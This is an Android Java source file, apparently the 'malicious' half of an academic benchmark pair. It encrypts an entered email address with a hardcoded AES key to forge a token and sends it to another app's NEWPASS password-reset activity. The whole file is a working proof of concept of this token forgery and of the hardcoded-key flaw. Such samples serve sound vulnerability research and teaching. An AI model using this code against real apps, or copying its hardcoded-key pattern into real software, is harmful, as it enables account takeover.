package edu.ksu.cs.malicious;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";
    static final String PROVIDED_TOKEN_KEY = "generatedToken";
    static final String INIT_VECTOR_KEY = "initVector";
    static final byte[] SECRET_KEY = "0123456789!@#$%^".getBytes();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume() {
        super.onResume();
        findViewById(R.id.button).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                EditText emailAddrText = (EditText) findViewById(R.id.emailText);
                String emailAddr = emailAddrText.getText().toString();

                Intent intent = new Intent("edu.ksu.cs.benign.NEWPASS");
                Cipher cipher;
                try {
                    cipher = Cipher.getInstance("AES/GCM/NoPadding");
                } catch (NoSuchAlgorithmException | NoSuchPaddingException e) {
                    Log.d(TAG, "Exception while creating cipher instance", e);
                    Toast.makeText(getApplicationContext(), "Cipher error",
                            Toast.LENGTH_LONG).show();
                    return;
                }

                SecretKeySpec secretKeySpec = new SecretKeySpec(SECRET_KEY,"AES");
                try {
                    cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);
                } catch (InvalidKeyException e) {
                    Log.d(TAG, "Exception while initializing cipher instance", e);
                    Toast.makeText(getApplicationContext(), "Cipher error",
                            Toast.LENGTH_LONG).show();
                    return;
                }

                try {
                    String token = Base64.encodeToString(cipher.doFinal(emailAddr.getBytes()),
                            Base64.DEFAULT);
                    intent.putExtra(PROVIDED_TOKEN_KEY, token);
                    Log.d(TAG, "Token = " + token);
                } catch (IllegalBlockSizeException | BadPaddingException e) {
                    Log.d(TAG, "Exception while encrypting data second time", e);
                    Toast.makeText(getApplicationContext(),
                            "Token was not emailed.  Try again :(",
                            Toast.LENGTH_LONG).show();
                    return;
                }

                String initializationVector = Base64.encodeToString(cipher.getIV(),
                        Base64.DEFAULT);
                intent.putExtra(INIT_VECTOR_KEY, initializationVector);
                Log.d(TAG, "IV = " + initializationVector);
                startActivity(intent);
            }
        });
    }
}
